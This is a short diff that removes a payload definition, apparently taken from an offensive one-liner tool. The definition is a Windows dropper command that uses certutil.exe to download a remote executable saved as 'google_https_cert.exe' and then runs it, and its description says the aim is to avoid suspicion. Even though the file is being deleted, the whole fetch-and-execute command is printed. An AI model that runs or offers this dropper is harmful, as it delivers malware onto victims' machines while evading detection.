@@ -1,7 +1,0 @@
-[Info]
-Author      = Karim shoair (D4Vinci)
-Description = Uses certutil to download your exe file like a cert file to avoid suspicion.
-
-[Payload]
-Type     = Dropper
-Payload  = certutil.exe -urlcache -split -f {} google_https_cert.exe && google_https_cert.exe
